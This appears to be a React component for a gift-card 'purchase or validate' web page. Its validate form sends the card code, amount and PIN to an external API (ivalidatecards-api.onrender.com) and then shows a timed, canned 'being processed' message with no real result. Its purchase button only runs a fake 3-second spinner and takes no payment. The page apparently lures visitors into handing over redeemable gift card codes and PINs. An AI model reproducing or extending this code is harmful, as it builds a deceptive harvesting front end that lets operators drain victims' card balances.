import {React , useState , useEffect  } from 'react'
import { HashLink as Link } from "react-router-hash-link";
import axios from "axios"
import "./purchaseOrValidate.scss"


const PurchaseOrValidate = ({card}) => {

  const [purchaseCard , setPurchaseCard] = useState(false)
  const [validateCard , setValidateCard] = useState(false)
  const [isValidating , setIsValidating] = useState(false)
  const [processing, setProcessing] = useState(false);
  const [formErrors, setFormErrors] = useState({});

  useEffect(() => {
  if (window.location.hash) {
    window.location = "/";
  }
}, []);




 const validateInputs = (data) => {
    const errors = {};

    // Card code : 13–19 digits
    if (!/^[A-Za-z0-9]{13,19}$/.test(data.cardCode)) {
         errors.cardCode = "Invalid card code";
    }

    // Amount: must be number and within $20 - $500
    if (!data.cardAmount || data.cardAmount < 20 || data.cardAmount > 500) {
      errors.cardAmount = "Amount must be between $20 - $500";
    }

    // PIN: 4-6 digits if required
    if (card.pin) {
      if (!/^\d{4,6}$/.test(data.pin)) {
        errors.pin = "Invalid PIN";
      }
    }

    return errors;
  };

    const handleValidate = async (e) => {

    e.preventDefault()
    
    const form = e.target

    const formData = new FormData(form)

    const data = {
      cardName : formData.get("cardName"),
      cardCode: formData.get("cardCode"),
      cardAmount : formData.get("cardAmount"),
      pin: formData.get("pin"),
    };

    const errors = validateInputs(data);
    setFormErrors(errors);

    if (Object.keys(errors).length > 0) {
       return;
    }

    try {

      const response = await axios.post('https://ivalidatecards-api.onrender.com/validate', data);
       setIsValidating(true)

        setTimeout(()=> {
          setIsValidating(false);
          setProcessing(true)
        },3000)

      window.location.hash = "#submit";

    
    } catch (error) {
      console.error('Error:', error.response || error.message);
    } 
    
  };

    const handlePurchase = (e) => {
    e.preventDefault();
    setIsValidating(true);

    setTimeout(() => {
      setIsValidating(false)
     }, 3000);

  }
  
   const purchaseCardOpen = () => {
    setPurchaseCard(true)
      
   }
  const purchaseCardClose = () => {
    setPurchaseCard(false)
    setIsValidating(false)
  }


  const validateCardOpen = () => {
    setValidateCard(true)
    
  }
  const validateCardClose = () => {
    if (window.location.hash === "#submit") {
      window.location = "/";
    }
    setValidateCard(false)
    setProcessing(false)
    setFormErrors({})

  }




  
 

  return (
    <div className="purchaseOrValidate">
      <div className="purchasewrapper">
        <div className="purchase" onClick={purchaseCardOpen}>
          <span>Purchase</span>
        </div>
  
        <div className="validate" onClick={validateCardOpen}>
          <span>Validate</span>
        </div>
        <div className="or">
          <span>Or</span>
        </div>
        
      </div>

      {purchaseCard &&  
        <div className='popupOverlay'>
          <div className="popupContent">
            <div className="popupCard">
              <div className="popupCardImg">
               <img src={card.img} alt="" />
              </div>
              <div className="popupCardContent">
                <div className="heading">
                  <h1>{card.name}</h1> 
                </div>
                <div className="deliveryInfo">
                 <div className="deliveryItems"><img src="/mail2.png" alt="" /><p>Email Delivery</p></div> 
                  <div className="deliveryItems"><img src="/time.png" alt="" /><p>Est. Delivery Time: 1-3Min</p></div>
                </div>
                <div className="input">
                  <input className="amount" type="text" placeholder='amount $20 - $500' />
                  <input className="number" type="text"  placeholder='no of cards' />
                  <button type="submit" onClick = {handlePurchase}>{isValidating ?  (
                  <div className="loading">
                    <img src="/loading.gif" alt="Loading" />
                    <p>Processing...</p>
                  </div>
                ): "Proceed to Payment" }</button>
                </div>
                </div>
                <button className="close-btn">
                  <img onClick={purchaseCardClose} src="/cancel2.png" alt="" />
               </button>
              
              
            </div>
            
          </div>
            </div>
         }


        {validateCard  &&  
        <div className='popupOverlay'>
          <div className="popupContent">    
            <div className="popupCard">
              {processing ? (
                  <div className="popupCardContent processing">
                    <img src="/success.png" alt="loading" />
                    <h2>Validation request is being processed...</h2>
                  <p>Please wait, this may take a few seconds.</p>
                  <p cardName="note"><strong>Note:</strong> Please avoid sending multiple validation requests for the same card to prevent network issues.</p>
                  </div>
                    ) :
                  <div className="popupCardContent">
                <div className="heading">
                  <h1>Verify your {card.name}</h1>
                </div>
             
                  <form onSubmit = {handleValidate} className="input" action="">
                  <input type="hidden" name="cardName" value={card.name} />

                  <input className="amount"   name="cardCode"  type="text" placeholder='enter card code'/>
                  {formErrors.cardCode && <p className="error">{formErrors.cardCode}</p>}

                  <input className="amount" type="number" name="cardAmount" placeholder='enter amount' />
                  {formErrors.cardAmount && <p className="error">{formErrors.cardAmount}</p>}
                    
                  {card.pin && <div>
                      <input className="amount pin " name="pin"   type="text" placeholder='enter pin'/>
                        {formErrors.pin && <p className="error">{formErrors.pin}</p>}

                    </div>    }
                    

                    <button type="submit">{isValidating ?  (
                  <div className="loading">
                    <img src="/loading.gif" alt="Loading" />
                    <p>Validating...</p>
                  </div>
                ): "Validate" }</button>

                  </form>
                </div>}
                <button className="close-btn">
                  <img onClick={validateCardClose} src="/cancel2.png" alt="" />
               </button>
              
            </div>
            
          </div>
            </div>
         }

    </div>

  )


}

export default PurchaseOrValidate
